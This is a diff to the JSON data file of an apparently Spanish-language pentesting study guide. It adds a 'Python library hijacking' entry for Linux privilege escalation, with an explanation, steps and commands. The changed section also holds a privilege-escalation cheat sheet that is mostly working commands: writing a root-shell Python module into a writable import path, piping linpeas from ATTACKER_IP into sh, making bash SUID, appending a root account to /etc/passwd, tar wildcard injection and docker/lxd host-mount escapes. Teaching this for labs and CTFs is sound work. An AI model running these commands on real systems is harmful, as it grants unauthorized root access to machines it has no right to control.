@@ -2,10 +2,10 @@
   "generatedAt": "2026-07-09",
   "stats": {
     "totalSections": 19,
-    "totalCommands": 453,
+    "totalCommands": 458,
     "totalTags": 9,
     "totalGuides": 8,
-    "totalConcepts": 41,
+    "totalConcepts": 42,
     "totalPaths": 9
   },
   "tags": [
@@ -1810,6 +1810,11 @@
         "getcap -r / 2>/dev/null",
         "/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
         "/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'",
+        "sudo -l",
+        "python3 -c 'import sys; print(sys.path)'",
+        "ls -la script.py $(dirname script.py)",
+        "find / -name '*.py' -writable ! -path '/proc/*' 2>/dev/null",
+        "echo 'import os; os.setuid(0); os.system(\"/bin/bash\")' > /dir_escribible/modulo_importado.py",
         "cat /etc/crontab; ls -la /etc/cron.*",
         "echo 'chmod +s /bin/bash' >> script_escribible.sh",
         "touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh privesc.sh'",
@@ -1926,6 +1931,20 @@
         ],
         [
           "h2",
+          "Python library hijacking"
+        ],
+        [
+          "code",
+          [
+            "sudo -l",
+            "python3 -c 'import sys; print(sys.path)'",
+            "ls -la script.py $(dirname script.py)",
+            "find / -name '*.py' -writable ! -path '/proc/*' 2>/dev/null",
+            "echo 'import os; os.setuid(0); os.system(\"/bin/bash\")' > /dir_escribible/modulo_importado.py"
+          ]
+        ],
+        [
+          "h2",
           "Cron / tareas"
         ],
         [
@@ -2024,7 +2043,7 @@
           ]
         ]
       ],
-      "searchText": "Linux privesc De shell normal a root por permisos, tareas, configs o credenciales. La regla: si puedes modificar algo que otro usuario mas privilegiado ejecuta o lee, tienes un vector potencial. whoami; id; groups; hostname; pwd find / -perm -4000 -type f -ls 2>/dev/null find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev' systemctl list-timers 2>/dev/null Automatizado (linpeas paso a paso) wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh python3 -m http.server 8000 curl -sL http://ATTACKER_IP:8000/linpeas.sh | sh wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/linpeas.out ./pspy64 sudo / GTFOBins sudo -l sudo find . -exec /bin/sh \\; -quit sudo vim -c ':!/bin/sh' sudo env /bin/sh sudo LD_PRELOAD=/tmp/x.so <binario> SUID / SGID find / -perm -4000 -type f 2>/dev/null /usr/bin/find . -exec /bin/sh -p \\; -quit cp $(which bash) /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p Capabilities getcap -r / 2>/dev/null /usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' /usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";' Cron / tareas cat /etc/crontab; ls -la /etc/cron.* echo 'chmod +s /bin/bash' >> script_escribible.sh touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh privesc.sh' Ficheros escribibles ls -la /etc/passwd /etc/shadow openssl passwd -1 -salt hax pass123 echo 'r00t:<hash>:0:0::/root:/bin/bash' >> /etc/passwd && su r00t NFS no_root_squash cat /etc/exports showmount -e $IP sudo mount -o rw $IP:/share /mnt && cp $(which bash) /mnt/bash && chmod +s /mnt/bash Kernel / version uname -a; cat /etc/os-release searchsploit linux kernel <version> Contenedores (docker / lxd) id docker run -v /:/mnt --rm -it alpine chroot /mnt sh lxc image import ./alpine.tar.gz --alias privesc lxc init privesc r00t -c security.privileged=true lxc config device add r00t host disk source=/ path=/mnt/root recursive=true lxc start r00t && lxc exec r00t /bin/sh Vector Que mirar sudo NOPASSWD, binarios GTFOBins, scripts como otro usuario, rutas relativas. SUID/SGID bash, find, vim, less, cp, tar, zip, python, perl, nmap, env. Capabilities cap_setuid, cap_dac_read_search, cap_dac_override, cap_sys_admin. Cron/timers Scripts escribibles, PATH inseguro, comodines, backups ejecutados como root. Credenciales Configs, backups, /var/www, .ssh, history, DB dumps. Contenedores docker/lxd/lxc groups, docker.sock, montajes privilegiados."
+      "searchText": "Linux privesc De shell normal a root por permisos, tareas, configs o credenciales. La regla: si puedes modificar algo que otro usuario mas privilegiado ejecuta o lee, tienes un vector potencial. whoami; id; groups; hostname; pwd find / -perm -4000 -type f -ls 2>/dev/null find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev' systemctl list-timers 2>/dev/null Automatizado (linpeas paso a paso) wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh python3 -m http.server 8000 curl -sL http://ATTACKER_IP:8000/linpeas.sh | sh wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/linpeas.out ./pspy64 sudo / GTFOBins sudo -l sudo find . -exec /bin/sh \\; -quit sudo vim -c ':!/bin/sh' sudo env /bin/sh sudo LD_PRELOAD=/tmp/x.so <binario> SUID / SGID find / -perm -4000 -type f 2>/dev/null /usr/bin/find . -exec /bin/sh -p \\; -quit cp $(which bash) /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p Capabilities getcap -r / 2>/dev/null /usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' /usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";' Python library hijacking sudo -l python3 -c 'import sys; print(sys.path)' ls -la script.py $(dirname script.py) find / -name '*.py' -writable ! -path '/proc/*' 2>/dev/null echo 'import os; os.setuid(0); os.system(\"/bin/bash\")' > /dir_escribible/modulo_importado.py Cron / tareas cat /etc/crontab; ls -la /etc/cron.* echo 'chmod +s /bin/bash' >> script_escribible.sh touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh privesc.sh' Ficheros escribibles ls -la /etc/passwd /etc/shadow openssl passwd -1 -salt hax pass123 echo 'r00t:<hash>:0:0::/root:/bin/bash' >> /etc/passwd && su r00t NFS no_root_squash cat /etc/exports showmount -e $IP sudo mount -o rw $IP:/share /mnt && cp $(which bash) /mnt/bash && chmod +s /mnt/bash Kernel / version uname -a; cat /etc/os-release searchsploit linux kernel <version> Contenedores (docker / lxd) id docker run -v /:/mnt --rm -it alpine chroot /mnt sh lxc image import ./alpine.tar.gz --alias privesc lxc init privesc r00t -c security.privileged=true lxc config device add r00t host disk source=/ path=/mnt/root recursive=true lxc start r00t && lxc exec r00t /bin/sh Vector Que mirar sudo NOPASSWD, binarios GTFOBins, scripts como otro usuario, rutas relativas. SUID/SGID bash, find, vim, less, cp, tar, zip, python, perl, nmap, env. Capabilities cap_setuid, cap_dac_read_search, cap_dac_override, cap_sys_admin. Cron/timers Scripts escribibles, PATH inseguro, comodines, backups ejecutados como root. Credenciales Configs, backups, /var/www, .ssh, history, DB dumps. Contenedores docker/lxd/lxc groups, docker.sock, montajes privilegiados."
     },
     {
       "id": "section-12",
@@ -5481,6 +5500,50 @@
           "out": "El par usuario:password que NO dispara el mensaje de fallo. Si TODO sale como valido, tu F= no coincide con el mensaje real: copialo exacto de la respuesta. Usa S= si prefieres marcar el exito."
         }
       ]
+    },
+    {
+      "id": "python-library-hijacking",
+      "title": "Python library hijacking",
+      "phase": "privesc",
+      "section": "linux-privesc",
+      "summary": "Un script Python que corre como root importa un modulo; si puedes escribir ese modulo (o uno que Python busque antes), tu codigo corre como root.",
+      "que": "Cuando un script de Python que se ejecuta como root hace 'import modulo', Python busca ese modulo recorriendo una lista de directorios (sys.path) en orden. Si puedes colocar un fichero .py con ese nombre en un directorio que se busque ANTES que el modulo real, o sobrescribir el propio modulo, tu codigo se ejecuta con privilegios de root al importarse. Es el [[path-hijacking]] aplicado al sistema de imports de Python.",
+      "porque": "sys.path incluye, y normalmente en primer lugar, el directorio del propio script; ademas de PYTHONPATH y los site-packages. El programador confia en que se importara el modulo legitimo, pero Python simplemente coge el primero que encuentra. Si el directorio del script es escribible, o el modulo importado lo es, o sudo conserva PYTHONPATH, rompes esa confianza. Misma logica que el [[privesc-modelo]].",
+      "cuando": "Cuando puedes ejecutar un script Python como root (via [[sudo-abuse]]) o un cron root lo ejecuta, Y puedes escribir uno de los sitios donde Python busca sus modulos. Es un vector muy comun en rooms de escalada Linux.",
+      "necesitas": [
+        "Un script Python que corre como root (sudo -l con un .py, o un cron).",
+        "Que el script haga 'import <algo>' de un modulo (idealmente no estandar).",
+        "Poder ESCRIBIR uno de: el directorio del script, el fichero del modulo importado, un directorio que aparezca antes en sys.path, o controlar PYTHONPATH (sudo env_keep)."
+      ],
+      "senales": [
+        "sudo -l te deja ejecutar un script .py como root.",
+        "El directorio del script (o un modulo que importa) es escribible por tu usuario.",
+        "El script hace 'import' de un modulo con nombre poco comun que vive junto a el.",
+        "sudo -l muestra env_keep+=PYTHONPATH."
+      ],
+      "pasos": [
+        "Lee el script root e identifica que modulos importa.",
+        "Mira sys.path y los permisos: ¿puedes escribir el dir del script, el modulo, o un dir que preceda al real?",
+        "Crea un fichero con el nombre del modulo importado que ejecute tu payload (os.setuid(0) + shell).",
+        "Ejecuta el script como root; al importar tu modulo, corre como root. Confirma con id (uid=0)."
+      ],
+      "commands": [
+        {
+          "cmd": "sudo -l",
+          "why": "Punto de partida: ver si puedes ejecutar un script .py como root. Una entrada NOPASSWD sobre un python es el candidato tipico de este vector.",
+          "out": "Lineas '(root) NOPASSWD: /usr/bin/python3 /ruta/script.py'. Abre y lee ese script: te dice que modulos importa y donde vive."
+        },
+        {
+          "cmd": "python3 -c 'import sys; print(sys.path)'",
+          "why": "Muestra el orden en que Python busca modulos. El primer directorio escribible que preceda al modulo real es tu hueco para inyectar.",
+          "out": "Lista de directorios. Si el dir del script (o '' = dir actual) va primero y es escribible, tienes hijacking directo. Cruza esto con los permisos."
+        },
+        {
+          "cmd": "echo 'import os; os.setuid(0); os.system(\"/bin/bash\")' > /dir_escribible/modulo.py",
+          "why": "Crea un modulo malicioso con el MISMO nombre que el que importa el script. Al ejecutarse el script como root, importa el tuyo y ejecuta tu codigo con uid 0.",
+          "out": "Al lanzar 'sudo python3 /ruta/script.py', obtienes una shell root (id = uid=0). Ajusta el nombre del fichero al modulo exacto que importa el script."
+        }
+      ]
     }
   ],
   "paths": [
@@ -5516,6 +5579,7 @@
         "capabilities",
         "cron-abuse",
         "path-hijacking",
+        "python-library-hijacking",
         "wildcard-injection",
         "sudo-ld-preload",
         "writable-sensitive-files",
